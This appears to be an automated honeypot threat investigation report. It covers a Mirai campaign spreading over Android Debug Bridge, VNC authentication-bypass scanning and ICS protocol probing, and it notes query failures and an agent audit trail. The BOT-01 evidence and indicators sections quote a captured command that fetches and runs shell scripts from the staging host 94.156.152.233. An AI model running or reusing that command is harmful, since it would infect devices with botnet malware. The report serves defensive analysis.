# Threat Investigation Report

## 1. Investigation Scope
- **investigation_start:** 2026-03-11T00:00:06Z
- **investigation_end:** 2026-03-11T04:00:06Z
- **completion_status:** Partial
- **degraded_mode:** true - Key evidence correlation for Industrial Control System (ICS) related activity failed, limiting the assessment of that potential threat.

## 2. Executive Triage Summary
- **Top Services/Ports of Interest:** VNC (5900), SMB (445), Android Debug Bridge (ADB, 5555), and notable activity on uncommon Industrial Control System (ICS) protocols (Kamstrup, Guardian AST).
- **Top Confirmed Known Exploitation:**
    - High-volume scanning for VNC servers vulnerable to CVE-2006-2369 (No authentication required).
    - Confirmed Mirai botnet infection activity via Android Debug Bridge (ADB), involving a full downloader and execution chain.
- **Top Unmapped Exploit-Like Items:** None. All high-confidence exploit-like behavior was successfully mapped to known threats.
- **Botnet/Campaign Mapping Highlights:**
    - A Mirai botnet campaign (BOT-01) was identified, including the compromised source IPs (from ASN 209605), and a shared staging host (94.156.152.233) used to serve malware payloads.
    - A large-scale, single-source VNC scanning campaign (BOT-02) was identified originating from 185.231.33.22.
- **Major Uncertainties:** The source of scanning activity against rare ICS protocols (Kamstrup, Guardian AST) could not be determined due to a backend query failure.

## 3. Candidate Discovery Summary
Candidate discovery surfaced three primary areas of interest:
1.  **Mirai Botnet Activity:** Adbhoney logs captured distinctive downloader commands (`wget`, `curl`) pointing to a known malware staging host.
2.  **VNC Scanning:** Extremely high-volume scanning for VNC authentication bypass (CVE-2006-2369) from a single IP.
3.  **ICS Protocol Probing:** Conpot logs showed interactions with `kamstrup_protocol` and `guardian_ast`.

*Material Impact:* The investigation's ability to assess the ICS activity was materially affected by the failure of `two_level_terms_aggregated` queries, which prevented correlation of source IPs to the observed protocols.

## 4. Emerging n-day Exploitation
No activity corresponding to emerging n-day exploits was identified in this window.

## 5. Novel or Zero-Day Exploit Candidates
No novel or potential zero-day exploit candidates were validated in this investigation window.

## 6. Botnet/Campaign Infrastructure Mapping

### item_id: BOT-01 (Mirai Botnet)
- **campaign_shape:** spray
- **suspected_compromised_src_ips:** 91.224.92.196, 91.224.92.177
- **ASNs / geo hints:** 209605 (UAB Host Baltic), United Kingdom
- **suspected_staging indicators:**
    - `http://94.156.152.233` (IP linked to recent Mirai activity).
    - Payloads: `http://94.156.152.233/bins/w.sh`, `http://94.156.152.233/bins/c.sh`
- **suspected_c2 indicators:** None explicitly validated.
- **confidence:** High
- **operational notes:** This is a confirmed Mirai botnet infection campaign. The staging host is active and serving payloads. Recommend blocking the staging host IP and analyzing the malware samples. The source ASN has multiple IPs participating.

### item_id: BOT-02 (VNC Scanning Campaign)
- **campaign_shape:** spray
- **suspected_compromised_src_ips:** 185.231.33.22 (>21,000 events)
- **ASNs / geo hints:** 211720 (Datashield, Inc.), Seychelles
- **suspected_staging indicators:** None observed.
- **suspected_c2 indicators:** None observed.
- **confidence:** High
- **operational notes:** Commodity, high-volume scanning for VNC. Recommend adding the source IP to a blocklist for port 5900.

## 7. Odd-Service / Minutia Attacks

### item_id: ODD-01 (ICS Protocol Scanning)
- **service_fingerprint:** `kamstrup_protocol` (30 events), `guardian_ast` (27 events)
- **why it’s unusual/interesting:** These are uncommon ICS/SCADA protocols not typically seen in broad internet scanning. This could indicate targeted reconnaissance or a specialized toolkit.
- **evidence summary:** The protocols were observed in Conpot honeypot logs. However, correlation to source IPs failed. One raw log showed a source IP of `3.129.187.38`, but this could not be systematically confirmed.
- **confidence:** Low
- **recommended monitoring pivots:** The primary recommendation is to resolve the backend query failures preventing IP-to-protocol correlation. This would be a high-priority item if actor information could be attached.

## 8. Known-Exploit / Commodity Exclusions
- **VNC Authentication Bypass (CVE-2006-2369):** Over 22,000 events from `185.231.33.22` targeting port 5900, matching signature `ET EXPLOIT VNC Server Not Requiring Authentication (case 2)`. Classified as commodity scanning.
- **SMB Scanning:** Over 3,000 events from `121.33.147.168` targeting port 445. Considered background noise.
- **Credential Noise:** Standard brute-force attempts on SSH and other services using common usernames (`root`, `admin`, `ubuntu`) and passwords.

## 9. Infrastructure & Behavioral Classification
- **BOT-01 (Mirai):**
    - **Type:** Exploitation
    - **Shape:** Spray (multiple sources, shared infrastructure)
    - **Infra Reuse:** Confirmed staging host `94.156.152.233` used by at least two attacking IPs.
- **BOT-02 (VNC Scanner):**
    - **Type:** Exploitation (Scanning for known vulnerability)
    - **Shape:** Spray (single source, many targets)
    - **Infra Reuse:** No reuse observed.
- **ODD-01 (ICS):**
    - **Type:** Scanning
    - **Shape:** Unknown (due to evidence gaps)
    - **Fingerprint:** Odd-service (`kamstrup_protocol`, `guardian_ast`)

## 10. Evidence Appendix

### BOT-01 (Mirai)
- **source IPs:** `91.224.92.196`, `91.224.92.177`
- **ASNs:** `209605` (UAB Host Baltic)
- **target ports/services:** `5555/TCP` (Android Debug Bridge)
- **paths/endpoints:** `/bins/w.sh`, `/bins/c.sh`
- **payload/artifact excerpts:** `cd /data/local/tmp/; busybox wget http://94.156.152.233/bins/w.sh; sh w.sh; curl http://94.156.152.233/bins/c.sh; sh c.sh`
- **staging indicators:** `http://94.156.152.233`
- **temporal checks:** Unavailable

### BOT-02 (VNC Scanner)
- **source IPs:** `185.231.33.22` (count: 21813)
- **ASNs:** `211720` (Datashield, Inc.)
- **target ports/services:** `5900/TCP` (VNC)
- **payload/artifact excerpts:** Associated with `CVE-2006-2369` and signature `ET EXPLOIT VNC Server Not Requiring Authentication (case 2)`.
- **temporal checks:** Unavailable

## 11. Indicators of Interest
- **Staging Host IP:** `94.156.152.233`
- **Compromised Source IPs:** `91.224.92.196`, `91.224.92.177`, `185.231.33.22`
- **Malware URLs:** `http://94.156.152.233/bins/w.sh`, `http://94.156.152.233/bins/c.sh`
- **Malware Hashes (from Adbhoney, no public match):**
    - `7606918188be2bf1c8e11fce7be93f39147b8bab495b7f6363b2073d605df5d0`
    - `e0e223b8fdbc20bea6dfc92e1caac3c169efe8151805c66816c920a832598687`
- **Downloader Command:** `cd /data/local/tmp/; busybox wget http://94.156.152.233/bins/w.sh; sh w.sh; curl http://94.156.152.233/bins/c.sh; sh c.sh`

## 12. Backend Tool Issues
- **Tool Failures:**
    - `two_level_terms_aggregated(primary_field='type.keyword', secondary_field='src_ip.keyword', type_filter='Conpot')`
    - `two_level_terms_aggregated(primary_field='protocol.keyword', secondary_field='src_ip.keyword', type_filter='Conpot')`
- **Affected Validations:** These failures prevented the correlation of source IPs to the specific ICS protocols (`kamstrup_protocol`, `guardian_ast`) observed by the Conpot honeypot. This makes the `ODD-01` finding "provisional" and "low confidence", as actor attribution is not possible.

## 13. Agent Action Summary (Audit Trail)

- **agent_name:** ParallelInvestigationAgent
- **purpose:** Gathers broad, parallelized telemetry about the investigation window.
- **inputs_used:** Investigation time window.
- **actions_taken:** Queried for total attacks, top countries, IPs, ASNs, ports, known CVEs, alert signatures, credentials, and honeypot-specific data from Adbhoney, Conpot, and Tanner.
- **key_results:**
    - Identified massive VNC scanning activity (22k+ events from one IP).
    - Flagged CVE-2006-2369 as the top CVE.
    - Captured Mirai-like downloader commands in Adbhoney logs.
    - Captured rare ICS protocol interactions in Conpot logs.
- **errors_or_gaps:** None.

- **agent_name:** CandidateDiscoveryAgent
- **purpose:** Sifts through initial telemetry to identify and score potential threats.
- **inputs_used:** All outputs from ParallelInvestigationAgent.
- **actions_taken:** Used aggregation queries (`two_level_terms_aggregated`) to find correlated activity. Performed initial OSINT lookups with `search`.
- **key_results:**
    - Created candidate `BOT-01` for the Mirai-like Adbhoney activity.
    - Created candidate `BOT-02` for the high-volume VNC scanning.
    - Created candidate `ODD-01` for the Conpot ICS protocol activity.
- **errors_or_gaps:** Two `two_level_terms_aggregated` queries failed for Conpot data, blocking the ability to link source IPs to the observed ICS protocols.

- **agent_name:** CandidateValidationLoopAgent
- **purpose:** Performs deep validation of a single candidate.
- **inputs_used:** Candidate `BOT-01` from the discovery queue.
- **actions_taken:**
    - Ran 1 iteration.
    - Validated 1 candidate (`BOT-01`).
    - Used `kibanna_discover_query` to confirm downloader command details and pivot on the staging IP.
    - Used `events_for_src_ip` to analyze other activity from the attacker IP.
- **key_results:** Confirmed `BOT-01` is a known Mirai infection pattern, validated the staging host, and identified multiple compromised source IPs from the same ASN.
- **errors_or_gaps:** None.

- **agent_name:** DeepInvestigationLoopController
- **purpose:** Manages the candidate validation and deep investigation loop.
- **inputs_used:** The queue of candidates from CandidateDiscoveryAgent.
- **actions_taken:** Loaded one candidate (`BOT-01`) for validation, saw the loop agent complete, then found no more candidates in the queue.
- **key_results:** Successfully processed the single high-confidence candidate. Exited loop.
- **errors_or_gaps:** None.

- **agent_name:** OSINTAgent
- **purpose:** Enriches validated and discovered candidates with public intelligence.
- **inputs_used:** `validated_candidates` (`BOT-01`), `candidate_discovery_result` (`ODD-01`).
- **actions_taken:** Used `search` to look for information on IPs, URLs, malware hashes, and protocol names.
- **key_results:** Confirmed the staging IP `94.156.152.233` is publicly associated with recent Mirai activity. Found no public documentation linking the observed ICS protocols or malware hashes to known threats.
- **errors_or_gaps:** None.

- **agent_name:** ReportAgent
- **purpose:** Compiles the final report from all available workflow state.
- **inputs_used:** All previous agent outputs.
- **actions_taken:** Aggregated all findings, errors, and agent summaries into this report.
- **key_results:** This markdown report.
- **errors_or_gaps:** Noted the `degraded_mode` status due to query failures in the CandidateDiscovery stage.

- **agent_name:** SaveReportAgent
- **purpose:** Saves the final report file.
- **inputs_used:** Final markdown report content.
- **actions_taken:** `default_write_file` called with report.
- **key_results:** File write status.
- **errors_or_gaps:** None.
